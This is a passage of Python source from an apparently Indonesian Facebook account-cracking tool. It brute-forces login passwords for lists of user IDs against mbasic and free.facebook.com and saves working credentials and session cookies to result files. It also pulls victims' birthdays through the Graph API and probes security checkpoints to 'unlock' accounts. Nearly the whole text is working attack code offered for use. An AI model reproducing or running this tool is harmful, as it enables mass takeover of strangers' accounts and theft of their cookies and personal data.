				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						try :
							bacot = mantap["summary"]["total_count"]
						except (KeyError,IOError):
							bacot = mantap["birthday"].split("/")
						lahir = bacot
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								cepeh()
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+u+" >< "+l+pw+u+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								cepeh()
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+u+" >< "+l+pw+u+" >< "+l+lahir[1]+" "+nama_bulan)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								cepeh()
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+u+" >< "+l+pw+u+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								cepeh()
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+u+" >< "+l+pw+u+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							cepeh()
							emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+u+" >< "+l+pw+u+" >< "+l+tahunnya+"          ")
							bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							cepeh()
							emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+u+" >< "+l+pw+"          ")
							bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
				emil("\r"+uid+pw)
		except requests.exceptions.ConnectionError:
			time.sleep(30)

# CRACK MBASIC

def mbasic(uid,pwx,loop):
	if "random" in random_gak:
		ua = random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua = open(".user.txt","r").read()
		except IOError:
			ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	emil(s+"\r["+u+"McybearX"+s+"] "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	ses = requests.Session()
#	emil(pwx)
	for pw in pwx:
		try:
			ses.headers.update({
			"Host":"mbasic.facebook.com",
			"cache-control":"max-age=0",
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			})
#			p = ses.get("https://mbasic.facebook.com")
			b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					okeh()
					emil(u+"\rʕ"+h+"OK"+u+"ʔ"+b+" "+uid+u+" >< "+p+pw+u+" >< "+h+tahunnya+"  ")
					bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
                                                tahunnya = joined_year[5]
					okeh()
					emil(u+"\rʕ"+h+"OK"+u+"ʔ"+b+" "+uid+u+" >< "+p+pw+u+" >< "+tahunnya)
					bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">coki<"+kuki+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								cepeh()
								emil(ua)
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								cepeh()
								emil(ua)
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+u+" >< "+s+tahunnya)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								cepeh()
								emil(ua)
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								cepeh()
								emil(ua)
								emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+u+" >< "+s+tahunnya)
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							cepeh()
							emil(ua)
							emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
							bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							cepeh()
							emil(ua)
							emil(u+"\rʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+"          ")
							bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

def coba():
#	global uid,pwx,loop,bukaan
	loop=0
	bak = input(" Masukan Pile : ")
	bukaan = open(bak,"r").readlines()
	for sup in bukaan:
		loop+=1
		us = sup.replace("\n","")
		uid=us.split(">")[0]
		pwx=us.split(">")[1]
		smoke_sinte_efreeday(uid,pwx,loop)
gibah=[]
jan_gibah=[]
# Metode Free.Facebook
def smoke_sinte_efreeday(uid,pwx,loop,payload):
	if "random" in random_gak:
		ua=random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua=open(".user.txt","r").read()
		except (KeyError,IOError):
			ua="Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	emil(s+"\r("+u+uid+s+") "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	rek = requests.Session()
	for pw in pwx:
		pala=rek.headers.update({"Host": "free.facebook.com","cache-control":"max-age=0","Upgrade-Insecure-Requests": "1",'sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin',"User-Agent": ua,'content-length': str(random.randint(100, 200)),'content-type': 'application/x-www-form-urlencoded',"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8","Referer": "https://free.facebook.com/login.php","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		try:
			if "santai" in katanya:
				dita = {'lsd': str(payload['lsd']),'jazoest': str(payload['jazoest']),'m_ts': str(payload['m_ts']),'li': str(payload['li']),'try_number': str(payload['try_number']),'unrecognized_tries': str(payload['unrecognized_tries']),'email': uid,'pass': pw,'bi_xrwh': str(payload['bi_xrwh']),'login': 'submit'}
			elif "ligat" in katanya:
				dita={"email":uid,"pass":pw,"login":"submit"}
			xox=rek.post("https://free.facebook.com/login.php",headers=pala,data=dita).text
			if "an" in gibah:
				emil("ah")
			else:
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunya = " "
				usupyangganteng="yaiyalah"
				if "c_user" in rek.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in rek.cookies.get_dict().items() ])
					if "old" in old_gak:
						okeh()
						emil(u+"\rʕ"+h+"OK"+u+"ʔ"+b+" "+uid+u+" >< "+p+pw+u+" >< "+h+tahunnya+h+" > "+kuki+"  \n")
						bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
						ok.append(uid+"|"+pw)
					else:
						okeh()
						emil(u+"\rʕ"+h+"OK"+u+"ʔ"+b+" "+uid+u+" >< "+p+pw+u+" >< "+p+tahunnya+u+"> "+h+kuki+"  \n")
						bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">coki<"+kuki+"\n");bts.close()
						ok.append(uid+"|"+pw)
				elif "free_logout_button" in xox or 'save-device' in xox:
					if "old" in old_gak:
						okeh()
						emil(u+"\rʕ"+h+"OK"+u+"ʔ"+b+" "+uid+u+" >< "+p+pw+u+" >< "+p+tahunnya+"  ")
						bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
						ok.append(uid+"|"+pw)
					else:
						okeh()
						emil(u+"\rʕ"+h+"OK"+u+"ʔ"+b+" "+uid+u+" >< "+p+pw+u+" >< "+tahunnya+"  ")
						bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
						ok.append(uid)
				elif "checkpointSubmitButton-actual-button" in xox or "checkpoint" in xox or "checkpointSubmitButton" in xox:
					if "jangan" in opsit:
						try:
							if "old" in old_gak:
								cepeh()
								emil("\r"+u+"ʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"   ")
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
								cp.append(uid)
							else:
								cepeh()
								emil("\r"+u+"ʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"   ")
								bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
								cp.append(uid)
						except :
							cepeh()
							emil("\r"+u+"ʕ"+k+"check"+u+"ʔ"+s+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"   ")
							bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid)
					elif "munculkan" in opsit:
						try:
							ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
							mantap = json.loads(ttl.text)
							bacot = mantap["birthday"]
							lahir = bacot.split("/")
							ceker_ttl(uid,pw,ua,lahir,tahunnya)
						except (KeyError,IOError):
							ceker(uid,pw,ua,tahunnya)
					break
				elif "Apakah Anda lupa kata sandi?" in xox:
					continue
				elif "Anda menggunakan kata sandi lama. Jika lupa kata sandi Anda saat ini, Anda dapat meminta" in xox:
					continue
				elif "Cari" in xox:
					continue
				elif "Nama pengguna atau kata sandi tidak valid" in xox:
					continue
				elif "Kata sandi yang Anda masukkan salah. " in xox:
					continue
				else:
					continue
		except requests.exceptions.ConnectionError:
			time.sleep(30)
# CEKER OPSI
def ceker(uid,pw,ua,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "old" in old_gak:
			cepeh()
			emil(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
			bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		else:
			cepeh()
			emil(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+"          ")
			bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			emil("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):emil("\r"+balmond+l+"   "+h+"Tap Yes Nih Derr")
		emil("\r"+h+batas)

def ceker_ttl(uid,pw,ua,lahir,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("usup"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if len(lahir)==2:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				cepeh()
				emil(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
				bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				cepeh()
				emil(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
				bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
		else:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				cepeh()
				emil_lope_usup(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
				bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				cepeh()
				emil(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
				bts = open("Hasil/Cp/%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			emil("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):
			okeh()
			emil("\r"+balmond+l+"   "+h+"Tap Yes Nih Derr")
		emil("\r"+h+batas)

# CEK OPSI

def cek_opsi():
	loop = 0
	emil("\n"+balmond+l+" Masukan Nama File")
	emil(balmond+l+" Contoh : "+k+"Hasil/Cp/%s.txt"%(hck))
	inp = usup(balmond+l+" Nama File : "+h)
	try:
		tes = open(inp,"r").readlines()
	except IOError:
		jalan("\n"+balmond+m+" File Tidak Ada/Nama File Salah...")
		time.sleep(0.5)
		menu()
	emil(balmond+l+" Terdapat : "+k+"%s Akun"%len(tes))
	emil("")
	for cinta in tes:
		loop+=1
		sayang = cinta.replace("\n","")
		gemes = sayang.split(">")
		yaudah_iya (gemes[0], gemes[1], loop, tes)
	exit()

# GAK TAU

def yaudah_iya(user,pasw,loop,tes):
	mb = ("https://mbasic.facebook.com")
	try:
		ua = open(".user.txt","r").read()
	except (IOError,KeyError):
		ua = random.choice(kalo_random).replace("\n","")
	ses = requests.Session()
	emil(u+"\r ʕ"+k+user+u+"ʔ "+p+"%s/%s Unlock Proses..."%(loop,len(tes)), end=' ');sys.stdout.flush()
	try:
		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		data = {}
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":user,"pass":pasw})
		cup = ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text
		run = parser(cup, "html.parser")
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			emil(u+"\r ["+h+"Unlock Success"+u+"]"+h+" "+user+u+" >< "+h+pasw+u+" >< "+h+kuki)
			emil(h+batas)
		elif "mbasic_logout_button" in cup or "save-device" in cup:
			emil(u+"\r ["+h+"Unlock Success"+u+"]"+h+" "+user+k+" >< "+h+pasw)
			emil(h+batas)
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			kuper = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in kuper.find_all("option")]
			emil(u+"\r ["+k+"Unlock Failed"+u+"]"+b+" "+user+k+" >< "+l+pasw)
			numbur=0
			for opt in range(len(ngew)):
				numbur+=1
				emil("\r "+u+"["+k+f"{numbur}"+u+"]"+l+" "+ngew[opt])
			if "0" in str(len(ngew)):
				emil("\r "+u+"["+h+"X"+u+"]"+h+" Unlock Succes..."+u+" ["+h+"X"+u+"]"+p+" login di mbasic.facebook.com/Fb lite SEKARANG!!!")
				emil("")
		elif "Cari" in cup:
			emil(u+"\r ["+m+"Unlock Failed"+u+"]"+m+"   "+user+k+" >< "+m+pasw+u+"\n ["+m+"X"+u+"]"+p+" Akun ini Sudah Di Blokir Oleh Facebook \n")
		elif "Apakah Anda lupa kata sandi?" in cup:
			emil(u+"\r ["+m+"Unlock Failed"+u+"]"+m+"   "+user+k+" >< "+m+pasw+"\n")
		elif "Anda menggunakan kata sandi lama. Jika lupa kata sandi Anda saat ini, Anda dapat meminta" in cup:
			emil(u+"\r ["+m+"Unlock Failed"+u+"]"+m+"   "+user+k+" >< "+m+pasw+"\n")
		else:
			emil(run)
			emil(batas)
	except requests.exceptions.ConnectionError:
		time.sleep(31)

if __name__ == '__main__':
	menu()
